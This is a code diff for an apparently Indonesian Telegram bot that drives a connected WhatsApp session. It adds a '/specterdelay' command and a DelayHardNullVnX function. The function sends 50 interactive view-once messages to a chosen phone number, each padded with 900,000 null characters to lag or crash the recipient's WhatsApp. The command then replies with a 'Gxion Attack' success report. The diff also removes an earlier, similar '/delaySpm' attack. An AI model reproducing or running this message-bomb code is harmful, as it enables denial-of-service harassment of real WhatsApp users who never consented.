@@ -1125,7 +1125,8 @@ bot.action("xsettings", async (ctx) => {
 
 ╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
 
-◇ /update           
+◇ /update          
+◇ /connect
 ◇ /addprem
 ◇ /delprem
 ◇ /addadmin
@@ -1169,14 +1170,17 @@ bot.action("xbugs", async (ctx) => {
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐗𝐁𝐔𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
+╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
           
-◇ /delaySpm
+◇ /specterdelay
+
+╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
+
 ◇ /attack
 </pre>
 `;
 
-  await editMenu(ctx, caption, [[{ text: 🔙"𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
+  await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
 });
 
 bot.action("tools", async (ctx) => {
@@ -2126,25 +2130,43 @@ bot.command("killsesi", checkOwner, async (ctx) => {
     ctx.reply("❌ Gagal hapus session");
   }
 });
-/// ============= CASE BUG 1 SIMPEL=============\\\
-bot.command("delaySpm", checkAllPremium,checkWhatsAppConnection, async (ctx) => {
-  try {
-    const q = ctx.message.text.split(" ")[1];
-    if (!q) return ctx.reply("🪧 ☇ Example : /delaySpm 62xx");
+/// ============= CASE BUG 1 BEBAS SPAM=============\\\
+bot.command('specterdelay', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    const target = args[1];
 
-    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    if (!sock || !sock.user) return ctx.reply("❌ WA Belum Connect.");
+    if (!target) return ctx.reply("🪧 Format: /specterdelay 628xxx");
 
-    await ctx.reply(`✅ SUCCES MENGIRIM BUG ${q}`);
+    const cleanNumber = target.replace(/[^0-9]/g, '');
 
-    for (let i = 0; i < 4; i++) {
-      await XVanitasDelay(sock, target);
-      await sleep(1000);
+    try {
+           for (let i = 0; i < 50; i++) {
+            await DelayHardNullVnX(sock, target); 
+            await sleep(1000)
+        }
+
+        const now = new Date();
+        const dateStr = now.toLocaleDateString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
+        
+        const statusMessage = 
+`╭──「 Gxion Attack 」──
+ℹ Target         : ${cleanNumber}
+ⓘ Method         : DELAY 
+∅ Status         : ${3} Bugs Terkirim ☑
+X Date           : ${dateStr}
+╰───────────────────────────`;
+
+        await ctx.reply(statusMessage, 
+            Markup.inlineKeyboard([
+                [Markup.button.url('🔍 Cek Target (WA)', `https://wa.me/${cleanNumber}`)]
+            ])
+        );
+
+    } catch (error) {
+        console.error(error);
+        ctx.reply("❌ Gagal mengeksekusi delayInvisVnX.");
     }
-
-  } catch (err) {
-    console.error(err);
-    ctx.reply("❌ Terjadi error");
-  }
 });
 /// CASE BUG 2///
 bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
@@ -2183,6 +2205,33 @@ bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   }
 });
 // ------------ (  FUNCTION BUGS ) -------------- \\
+async function DelayHardNullVnX(sock, target, ptcp = true) {
+ 
+    let msg = await generateWAMessageFromContent(target, {
+        interactiveResponseMessage: {
+            body: {
+                text: "VnX",
+                format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+                name: "galaxy_message",
+                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
+                version: 3
+            }
+        }
+    }, { userJid: sock.user.id });
+
+    await sock.relayMessage(target, {
+        viewOnceMessage: {
+            message: msg.message
+        }
+    }, ptcp ? { 
+        messageId: msg.key.id, 
+        participant: { jid: target } 
+    } : { 
+        messageId: msg.key.id 
+    });
+}
 
 // --- Jalankan Bot --- //
 (async () => {
